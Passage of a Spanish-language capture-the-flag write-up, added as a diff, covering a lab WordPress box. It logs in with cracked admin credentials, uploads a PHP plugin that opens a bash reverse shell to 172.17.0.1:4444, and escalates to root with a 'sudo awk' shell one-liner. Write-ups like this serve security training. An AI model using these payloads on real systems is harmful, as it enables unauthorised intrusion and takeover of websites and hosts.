@@ -63,3 +63,47 @@ Si despues le decimos a WPscan que intente iniciar sesión con ese diccionario o
 
 Ya tenemos el usuario luisillo con passwd -> Luis1981 (y sabemos que es admin de wp)
 
+![[Pasted image 20241031153834.png]]
+
+Pues si que nos deja logearnos y para rematar vamos a conseguir una reverseshell a partir de la creación de un plugin. Es sencillo tan solo tenemos que poner un código malicioso en php, comprimirlo en zip y activar dicho plugin en wordpress
+
+```php
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'");
+?>
+```
+
+En cuanto le damos a activar en el propio wordpress nos mandará una conexión a nuestra terminal.
+
+![[Pasted image 20241031155437.png]]
+
+![[Pasted image 20241031155453.png]]
+
+Listo, ya estamos dentro. Ahora lo que tenemos que hacer es el tratamiento de terminal para pasar a una tty funcional.
+
+![[Pasted image 20241031155728.png]]
+
+Una vez con el tratamiento realizado toca pasar a la acción y ver que permisos tenemos o a donde podemos llegar a acceder...
+
+![[Pasted image 20241031155828.png]]
+
+Tras indagar un poco (realmente poco) nos topamos con una posible contraseña de luisillo -> iuisillopasswordsecret... Vamos a intentar logearnos a su usuario.
+
+```bash
+su luisillo
+```
+
+![[Pasted image 20241031161033.png]]
+
+Y tras probar a ver los permisos que tenemos con sudo -l descubrimos que tenemos permisos para ejecutar awk como root.
+
+![[Pasted image 20241031161128.png]]
+
+Nos dirigimos a GTFObins y vemos a ver si nos topamos con ua autentica ventana para escalar privs...
+
+```bash
+sudo awk 'BEGIN {system("/bin/sh")}'
+```
+
+![[Pasted image 20241031161339.png]]
+
